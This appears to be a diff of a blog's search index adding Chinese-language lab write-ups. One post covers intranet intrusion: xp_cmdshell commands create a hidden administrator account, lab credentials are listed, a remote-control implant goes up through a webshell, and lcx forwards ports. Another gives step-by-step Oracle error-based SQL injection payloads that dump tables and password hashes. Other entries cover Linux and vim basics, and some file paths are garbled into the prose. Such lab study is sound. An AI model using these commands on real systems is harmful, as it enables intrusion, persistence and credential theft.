@@ -1,6 +1,64 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>lcx端口转发</title>
+    <url>/2021/09/03/lcx/</url>
+    <content><![CDATA[<h2 id="&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h2><p>&#x9776;&#x573A;&#x5730;&#x5740;</p>
+<p><a href="http://192.168.179.75/1.asp">http://192.168.179.75/1.asp</a></p>
+<p>&#x901A;&#x8FC7;fscan&#x626B;&#x63CF;&#x5F97;&#x5230;mssql&#x8D26;&#x53F7;&#x79D8;&#x5BC6;&#xFF0C;Navicat&#x94FE;&#x63A5;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#xFF0C;whoami&#x67E5;&#x770B;&#xFF0C;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;system&#xFF0C;&#x521B;&#x5EFA;&#x8D26;&#x53F7;gd13$&#xFF0C;&#x5BC6;&#x7801;admin@123&#xFF0C;&#x6DFB;&#x52A0;&#x5230;administrator&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x8BE5;&#x8D26;&#x53F7;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5728;www&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;asp&#xFF0C;&#x6253;&#x5F00;kali&#x8681;&#x5251;&#x94FE;&#x63A5;</p>
+<p><img src="/2021/09/03/lcx/image-20210831191818764.png" alt="image-20210831191818764"></p>
+<p>fscan &#x626B;&#x63CF;&#x76EE;&#x6807;ip  </p>
+<p><code>/home/kali/cs4.2/tools/fscan_amd64 -h 192.168.179.75</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831192054560.png" alt="image-20210831192054560"></p>
+<p><img src="/2021/09/03/lcx/image-20210831194028029.png" alt="image-20210831194028029"></p>
+<p><code>exec(&apos;xp_cmdshell &quot;whoami&quot;&apos;)</code></p>
+<p>&#x6DFB;&#x52A0;&#x7528;&#x6237; gd13$  admin@123 </p>
+<p><code>exec(&apos;xp_cmdshell &quot;net user gd13$ admin@123 /add&quot;&apos;)</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831202425448.png" alt="image-20210831202425448"></p>
+<p><img src="/2021/09/03/lcx/image-20210831202530309.png" alt="image-20210831202530309"></p>
+<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators gd13$ /add&quot;&apos;)</code></p>
+<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators&quot;&apos;)</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831202648860.png" alt="image-20210831202648860"></p>
+<p><img src="/2021/09/03/lcx/image-20210831203004613.png" alt="image-20210831203004613"></p>
+<p>&#x67E5;&#x770B;user&#x8868; &#x91CC;&#x9762;&#x6709;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF0C;&#x867D;&#x7136;&#x89E3;&#x5BC6;&#x6210;&#x529F;&#x4F46;&#x662F;&#xFF0C;&#x7981;&#x6B62;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;</p>
+<p><img src="/2021/09/03/lcx/image-20210831203016345.png" alt="image-20210831203016345"></p>
+<p>admin     qwer1234!@#$</p>
+<p><img src="/2021/09/03/lcx/image-20210831204542590.png" alt="image-20210831204542590"></p>
+<p>bao  bao123</p>
+<p><img src="/2021/09/03/lcx/image-20210831203215306.png" alt="image-20210831203215306"></p>
+<p><img src="/2021/09/03/lcx/image-20210831205122155.png" alt="image-20210831205122155"></p>
+<p>kali&#x4E2D;&#x6253;&#x5F00;cs &#x94FE;&#x63A5;vps&#x670D;&#x52A1;&#x5668;</p>
+<p><img src="/2021/09/03/lcx/image-20210903204618071.png" alt="image-20210903204618071"></p>
+<p><img src="/2021/09/03/lcx/image-20210903204838431.png" alt="image-20210903204838431"></p>
+<p>&#x751F;&#x6210;Windows&#x7248;&#x7684;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903205111769.png" alt="image-20210903205111769"></p>
+<p><img src="/2021/09/03/lcx/image-20210903205153499.png" alt="image-20210903205153499"></p>
+<p>&#x4F7F;&#x7528;&#x8681;&#x5251;&#x4E0A;&#x4F20;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903205420939.png" alt="image-20210903205420939"></p>
+<p>&#x53CC;&#x51FB;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;&#xFF0C;&#x5728;cs&#x4E2D;&#x67E5;&#x770B;</p>
+<p><img src="/2021/09/03/lcx/image-20210903210054589.png" alt="image-20210903210054589"></p>
+<p><img src="/2021/09/03/lcx/image-20210903210314507.png" alt="image-20210903210314507"></p>
+<p><img src="/2021/09/03/lcx/image-20210903210456317.png" alt="image-20210903210456317"></p>
+<p><code>shell C:\www\D:\blog\source\_posts\lcx.exe -tran 3333 192.168.1.107 8080</code></p>
+<p><img src="/2021/09/03/lcx/image-20210903211135544.png" alt="image-20210903211135544"></p>
+<p><img src="/2021/09/03/lcx/image-20210903211948437.png" alt="image-20210903211948437"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212024618.png" alt="image-20210903212024618"></p>
+<p>&#x8F6C;&#x53D1;&#x6210;&#x529F;&#xFF0C;&#x8BBF;&#x95EE;75&#x7684;3333&#x7AEF;&#x53E3;&#xFF0C;107&#x7684;8080&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x6210;&#x529F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903212112116.png" alt="image-20210903212112116"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212704462.png" alt="image-20210903212704462"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212729352.png" alt="image-20210903212729352"></p>
+<p>use18</p>
+<p><code>shell C:\www\D:\blog\source\_posts\lcx.exe -tran 4444 192.168.22.187 4444</code></p>
+<p><img src="/2021/09/03/lcx/image-20210903222630836.png" alt="image-20210903222630836"></p>
+<p><img src="/2021/09/03/lcx/image-20210903223233650.png" alt="image-20210903223233650"></p>
+<p><img src="/2021/09/03/lcx/image-20210903225319610.png" alt="image-20210903225319610"></p>
+<p><img src="/2021/09/03/lcx/image-20210903225342838.png" alt="image-20210903225342838"></p>
+<p>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;Tomcat</p>
+<p><img src="/2021/09/03/lcx/image-20210903230024732.png" alt="image-20210903230024732"></p>
+<p><img src="/2021/09/03/lcx/image-20210903230155364.png" alt="image-20210903230155364"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Linux命令基础</title>
     <url>/2021/06/04/Linux%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="Linux&#x547D;&#x4EE4;&#x57FA;&#x7840;"><a href="#Linux&#x547D;&#x4EE4;&#x57FA;&#x7840;" class="headerlink" title="Linux&#x547D;&#x4EE4;&#x57FA;&#x7840;"></a>Linux&#x547D;&#x4EE4;&#x57FA;&#x7840;</h1><p>&#x5173;&#x673A;&#x547D;&#x4EE4;&#xFF1A;poweroff</p>
@@ -31,7 +89,7 @@
 <p>-   &#x4E0A;&#x6B21;&#x5207;&#x8FC7;&#x6765;&#x7684;&#x76EE;&#x5F55;</p>
 <p><strong>&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#xFF1A;</strong></p>
 <p>Linux&#x76EE;&#x5F55;&#x4E0E;win&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#xFF0C;&#x662F;&#x4ECE;&#x201D; / &#x201C;&#x5F00;&#x59CB;&#xFF0C;&#x53EA;&#x6709;&#x5B83;&#x6CA1;&#x6709;&#x4E0A;&#x4E00;&#x7EA7;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x6B64;&#x53EB;&#x6839;&#x76EE;&#x5F55;</p>
-<p>&#x200B;    <img src="/2021/06/04/Linux%E5%91%BD%E4%BB%A4/data:," alt="0"></p>
+<p>  <img src="/2021/06/04/Linux%E5%91%BD%E4%BB%A4/image-20210906091403634.png" alt="image-20210906091403634"></p>
 <p>&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#xFF1A;</p>
 <p>/bin &#xFF1A;&#x5927;&#x90E8;&#x5206;&#x7684;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;</p>
 <p>/boot&#xFF1A;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x76EE;&#x5F55;</p>
@@ -171,6 +229,57 @@
 ]]></content>
   </entry>
   <entry>
+    <title>oracle注入报错注入</title>
+    <url>/2021/08/21/oracle/</url>
+    <content><![CDATA[<h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;</h4><p>&#x540C;MYSQL&#x6570;&#x636E;&#x5E93;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E9B;&#x8BED;&#x6CD5;&#x4E0D;&#x540C;&#xFF0C;&#x76F8;&#x6BD4;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#xFF0C;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x66F4;&#x52A0;&#x4E25;&#x8C28;&#xFF0C;&#x7531;&#x4E8E;&#x8FC7;&#x5EA6;&#x4E25;&#x8C28;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x7528;&#x663E;&#x9519;&#x6CE8;&#x5165;&#xFF0C;&#x4F1A;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x62A5;&#x9519;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5FFD;&#x89C6;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6570;&#x636E;<code>CTXSYS.DRITHSX.SN(user,())</code></p>
+<h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;</h4><p><code>select from all_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x8868;</p>
+<p><code>select from user_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x8868;</p>
+<p><code>select from all_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;</p>
+<p><code>select from user_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x5B57;&#x6BB5;</p>
+<p><code>select * from v$version</code> &#x67E5;&#x7248;&#x672C;</p>
+<p>mssql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>sysobjects</code>&#x3001;<code>syscolumns</code> &#x3001;<code>sysdatabases</code></p>
+<p>sql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>information_schema.tables</code> &#x3001;<code>information_schema.columns</code></p>
+<p>oracel &#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>user_table dual</code><br>Dual&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x8868;&#xFF08;&#x4E5F;&#x6709;&#x4EBA;&#x8BF4;&#x5B83;&#x662F;&#x865A;&#x8868;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#x5B83;&#xFF0C;&#x5B83;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;X&#xFF0C;&#x5217;&#x540D;&#x4E3A;DUMMY</p>
+<h4 id="dual-&#x865A;&#x8868;"><a href="#dual-&#x865A;&#x8868;" class="headerlink" title="dual &#x865A;&#x8868;"></a>dual &#x865A;&#x8868;</h4><p>&#x56E0;&#x4E3A;&#x8BED;&#x6CD5;&#x8981;&#x6C42;&#x5728;&#x67E5;&#x8BE2;&#x65F6;&#x4E00;&#x5B9A;&#x8981;&#x52A0;&#x8868;&#x540D;<br>&#x4F8B;&#x5982;&#xFF1A;<br><code>select 1,2,3,4,5 from dual</code>&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x7528;&#x4E8E;&#x628A;&#x8BED;&#x6CD5;&#x8865;&#x5168;<br>D:\blog\source_posts\oracle&#x5F31;&#x5316;&#x4E86;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x5E93;</p>
+<h4 id="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"><a href="#&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;" class="headerlink" title="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"></a>&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;</h4><p>&#x5982;&#x4F55;&#x5B9E;&#x73B0;limit &#x529F;&#x80FD;&#xFF1F;<br>D:\blog\source_posts\oracle &#x4E2D;&#x5229;&#x7528;<code>rownum=1</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E00;&#x884C;&#x6570;&#x636E;</p>
+<p>&#x5F53;<code>rownum&lt;3</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E24;&#x6761;</p>
+<p>&#x5F53; <code>rownum&lt;5</code>&#x53EF;&#x4EE5;&#x53D6;&#x56DB;&#x6761;<br>rownum &#x7684;&#x503C;&#x4F1A;&#x6839;&#x636E;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6539;&#x53D8;<br>&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;limit&#x529F;&#x80FD;<br><code>select username from(select rownum r, username from all users) where r=1</code><br>&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x4E2A;&#x8868;&#xFF0C;&#x5176;&#x4E2D;&#x2018;r&#x2019;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x522B;&#x540D;&#xFF0C;&#x5728;&#x8FD9;&#x4E00;&#x53E5;&#x4E2D;&#x5C31;&#x662F;rownum&#x7684;&#x522B;&#x540D;</p>
+<p>&#x8FDB;&#x5165;&#x9776;&#x573A;<br>&#x53D1;&#x73B0;id&#x4F20;&#x53C2;&#xFF0C;and 1=1&#xFF0C;&#x7F51;&#x9875;&#x663E;&#x793A;&#x6B63;&#x5E38;</p>
+<p><img src="/2021/08/21/oracle/01.png" alt="01"></p>
+<p><code>and 1=2</code> &#x62A5;&#x9519;&#xFF0C;&#x8868;&#x793A;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x6709;&#x4EA4;&#x4E92;</p>
+<p><img src="/2021/08/21/oracle/02.png" alt="02"><br>&#x67E5;&#x5B57;&#x6BB5;&#xFF0C;<br><code>order by 4</code> &#x663E;&#x793A;&#x6B63;&#x5E38;</p>
+<p><img src="/2021/08/21/oracle/03.png" alt="03"></p>
+<p><code>order by 5</code> &#x62A5;&#x9519;&#xFF0C;&#x6709;4&#x4E2A;&#x5B57;&#x6BB5;</p>
+<p><img src="/2021/08/21/oracle/04.png" alt="04"></p>
+<p>&#x8054;&#x5408;&#x67E5;&#x8BE2;,&#x56E0;&#x4E3A;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8981;&#x6C42;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;&#x8BED;&#x53E5;<br><code>union all select null,null,null,null from dual</code> </p>
+<p><img src="/2021/08/21/oracle/05.png" alt="05"><br>&#x4E0B;&#x9762;&#x4F7F;&#x7528;D:\blog\source_posts\oracle&#x65B9;&#x6CD5;</p>
+<h4 id="&#x4F18;&#x70B9;&#xFF1A;"><a href="#&#x4F18;&#x70B9;&#xFF1A;" class="headerlink" title="&#x4F18;&#x70B9;&#xFF1A;"></a>&#x4F18;&#x70B9;&#xFF1A;</h4><p>&#x53EF;&#x4EE5;&#x4E0D;&#x8003;&#x8651;&#x7C7B;&#x578B;</p>
+<h4 id="&#x539F;&#x7406;&#xFF1A;"><a href="#&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="&#x539F;&#x7406;&#xFF1A;"></a>&#x539F;&#x7406;&#xFF1A;</h4><p>&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5BF9;&#x67E5;&#x8BE2;&#x76F8;&#x5E94;&#x7684;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x7136;&#x540E;&#x67E5;&#x8BE2;&#x5931;&#x8D25;&#xFF0C;&#x7206;&#x51FA;&#x6570;&#x636E;</p>
+<h4 id="&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1"><a href="#&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1" class="headerlink" title="&#x51FD;&#x6570;&#xFF1A;ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))"></a>&#x51FD;&#x6570;&#xFF1A;<code>ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))</code></h4><p>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5148;&#x8FDB;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x67E5;&#x8BE2;&#x51FD;&#x6570;&#x67E5;&#x4E0D;&#x5230;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x771F;&#x6B63;&#x8981;&#x7684;&#x6570;&#x636E;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x91CC;&#x5DF2;&#x7ECF;&#x67E5;&#x8FC7;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x663E;&#x793A;&#x51FA;&#x6765;<br>&#x67E5;&#x8868;&#x540D;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))</code></p>
+<p><img src="/2021/08/21/oracle/06.png" alt="06"><br>&#x5F97;&#x5230;&#x8868;&#x540D;NEWS<br>&#x67E5;&#x5176;&#x4ED6;&#x8868;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&apos;NEWS&apos;))</code></p>
+<p><img src="/2021/08/21/oracle/07.png" alt="07"></p>
+<p>&#x5F97;&#x5230;ADMIN&#x8868;<br>&#x67E5;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))</code></p>
+<p><img src="/2021/08/21/oracle/08.png" alt="08"><br>&#x5F97;&#x5230;ID &#x5B57;&#x6BB5;<br>&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos;))</code></p>
+<p><img src="/2021/08/21/oracle/09.png" alt="09"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UNAME<br>&#x518D;&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and  column_name&lt;&gt;&apos;UNAME&apos;))</code></p>
+<p><img src="/2021/08/21/oracle/10.png" alt="10"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UPASS<br>&#x67E5;&#x5185;&#x5BB9;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 ))</code></p>
+<p><img src="/2021/08/21/oracle/11.png" alt="11"><br>&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF1A;<code>f583aea84b6ded258f529205eb6d56a7</code><br>&#x7EE7;&#x7EED;&#x67E5;&#x5176;&#x4ED6;&#x6570;&#x636E;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos;))</code></p>
+<p><img src="/2021/08/21/oracle/12.png" alt="12"><br>&#x8BD5;&#x8FC7;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x4E5F;&#x4E0D;&#x662F;flag&#xFF0C;&#x7EE7;&#x7EED;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos; and UPASS &lt;&gt;  &apos;9e8e7f6953dd11ceccc6ce655e03e070&apos;))</code></p>
+<p><img src="/2021/08/21/oracle/13.png" alt="13"><br>&#x5F97;&#x5230;flag&#xFF1A;<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>&#x8F93;&#x5165;&#x901A;&#x5173;</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>vim终端编辑器</title>
+    <url>/2021/06/27/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"><a href="#&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;" class="headerlink" title="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"></a>&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;</h2><h3 id="&#x5B89;&#x88C5;&#xFF1A;"><a href="#&#x5B89;&#x88C5;&#xFF1A;" class="headerlink" title="&#x5B89;&#x88C5;&#xFF1A;"></a>&#x5B89;&#x88C5;&#xFF1A;</h3><p><code>yum install -y vim</code></p>
+<h4 id="&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;"><a href="#&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;" class="headerlink" title="&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;"></a>&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;</h4><h4 id="&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;"><a href="#&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;" class="headerlink" title="&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;"></a>&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;</h4><p>vim filename    &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x82E5;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x5C31;&#x65B0;&#x5EFA;&#x6587;&#x4EF6;<br>esc&#xFF1A;&#x5207;&#x6362;&#x5230;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;<br>shift + zz &#xFF1A;&#x4FDD;&#x5B58;&#x9000;&#x51FA;<br>vim filename  +n&#xFF1A; &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;&#x7B2C;n&#x884C;<br>vim filename  +&#xFF1A; &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;&#x672B;&#x5C3E;<br>gg&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x9996;&#x884C;<br>G&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x5C3E;&#x884C;<br>ngg&#xFF1A;    &#x5B9A;&#x4F4D;&#x5230;&#x7B2C;n&#x884C;<br>^&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x884C;&#x9996;<br>$&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x884C;&#x5C3E;<br>yy&#xFF1A;        &#x590D;&#x5236;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;<br>p&#xFF1A;        &#x7C98;&#x8D34;<br>nyy&#xFF1A;    &#x590D;&#x5236;&#x5149;&#x6807;&#x5F00;&#x59CB;&#x7684;n&#x884C;<br>dd&#xFF1A;        &#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;<br>ndd&#xFF1A;    &#x5220;&#x9664;&#x5149;&#x6807;&#x5F00;&#x59CB;&#x7684;n&#x884C;<br>u&#xFF1A;        &#x64A4;&#x9500;&#x64CD;&#x4F5C;<br>ctrl + r:    &#x53CD;&#x64A4;&#x9500;&#x64CD;&#x4F5C;</p>
